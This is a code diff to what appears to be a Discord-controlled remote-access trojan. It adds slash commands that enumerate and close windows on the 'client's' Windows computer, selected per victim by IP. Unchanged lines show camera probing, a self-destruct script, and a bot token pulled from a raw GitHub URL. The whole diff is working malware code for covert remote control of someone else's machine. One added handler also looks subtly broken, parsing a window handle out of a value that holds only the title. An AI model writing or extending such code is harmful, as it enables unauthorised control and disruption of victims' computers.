@@ -28,6 +28,21 @@ import requests
 import sys
 import win32gui, win32con
 
+def get_open_windows():
+    windows = {}
+
+    def enum_windows_callback(hwnd, _):
+        if win32gui.IsWindowVisible(hwnd):
+            window_text = win32gui.GetWindowText(hwnd)
+            if window_text:
+                windows[hwnd] = window_text
+
+    win32gui.EnumWindows(enum_windows_callback, None)
+    return windows
+
+def close_window(hwnd):
+    win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
+
 def check_connected_cameras():
 
     camera_indices = range(10)
@@ -291,6 +306,55 @@ sys.exit(0)
     subprocess.Popen(["python", os.path.join(target_path, "self-destruct.py")])
     sys.exit(0)
     
+@client.slash_command(guild_ids=testServerId, description="Closes all windows on the client's computer")
+async def close_all_windows(interaction : Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        user_id = interaction.user.id
+
+        def enum_windows_callback(hwnd, windows):
+            if win32gui.IsWindowVisible(hwnd):
+                windows.append(hwnd)
+        
+
+        windows = []
+        win32gui.EnumWindows(enum_windows_callback, windows)
+
+        for hwnd in windows:
+            try:
+                win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
+            except Exception as e:
+                print(f"Could not close window {hwnd}: {e}")
+
+@client.slash_command(guild_ids=testServerId, description="Select a window to close on client's computer.")
+async def close_window_command(interaction: nextcord.Interaction):
+    category = interaction.channel.category
+    if str(category) == str(ip):
+        windows = get_open_windows()
+
+        if not windows:
+            await interaction.response.send_message("No open windows found.", ephemeral=True)
+            return
+
+        class WindowSelect(nextcord.ui.Select):
+            def __init__(self):
+                options = [
+                    nextcord.SelectOption(label=title[:100], description=f"HWND: {hwnd}")
+                    for hwnd, title in windows.items()
+                ]
+                super().__init__(placeholder="Select a window to close", options=options)
+
+            async def callback(self, select_interaction: nextcord.Interaction):
+                selected_hwnd = int(self.values[0].split("HWND: ")[1])
+                close_window(selected_hwnd)
+                await select_interaction.response.send_message(f"Closed window: {windows[selected_hwnd]}", ephemeral=True)
+
+        class WindowView(nextcord.ui.View):
+            def __init__(self):
+                super().__init__()
+                self.add_item(WindowSelect())
+
+        await interaction.response.send_message("Select a window to close:", view=WindowView(), ephemeral=True)
 
 r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/tok")
 token = r.text
